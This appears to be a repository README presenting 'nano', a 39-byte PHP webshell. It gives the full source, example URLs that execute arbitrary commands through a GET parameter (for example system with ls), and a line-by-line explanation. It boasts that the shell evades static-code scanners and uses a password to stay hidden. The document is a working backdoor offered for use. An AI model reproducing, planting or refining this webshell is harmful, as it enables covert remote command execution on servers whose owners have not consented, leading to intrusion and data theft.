# nano
nano is a PHP webshell which is code golfed to be extremely stealthy.\
Put it on watch maybe, I am planning to upload some variantions of it in near future.

### Usage
`http://example.com/nano.php?f=function&c=command&p=password`

`f` is for function\
`c` is for command\
`p` is for password

For example, the code below will execute the `ls` command:

`http://example.com/nano.php?f=system&c=ls&p=password`

### Features
- 39 bytes in size ([nodistribute.com](http://nodistribute.com/) said its an empty file lmao)
- Fully undetectable by security solutions that scan static code
- Supports password protection
- Fully flexible & efficient if you know stuff

## Functioning
nano consists of 39 characters and hence is 39 bytes in size.\
Source Code:
```php
<?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
```
Yeah I know that looks kind of puzzling but let me explaining it.

- `<?` a valid replacement for `<?php`

- `$x=$_GET;` defines a variable `x` which holds the value `$_GET` so we can use just `$x` instead of `$_GET` to save space.

- `(condition ? code : code )` is a shorthand for `if (condition){code}else{code}`. You can read more about it [here](https://davidwalsh.name/php-shorthand-if-else-ternary-operators).

- `$x[p]=='_'` this is the condition which is mentioned in the previous part. It checks if the value of parameter p is equal to `'_'`. Yep, `_` is the password.

- If the password matches, the code `$x[f]($x[c])` is executed. As you guys know, PHP's syntax for executing functions is `function(argument)`, I kept both `function` and `arugment` variables so you can specify them through a GET request.

- The `y` does nothing here, I just had to add it to maintain the syntax.

- Why didn't I end it with a `?>`? Because we don't need to.

#### Everything Else
This is my first php thingy so if there's way to do what I did in a better way please let me know or open a pull request.\
This 39 characters of code is licensed under **MIT license** which basically means you have to give me credit if you want to redistribute or modify it.
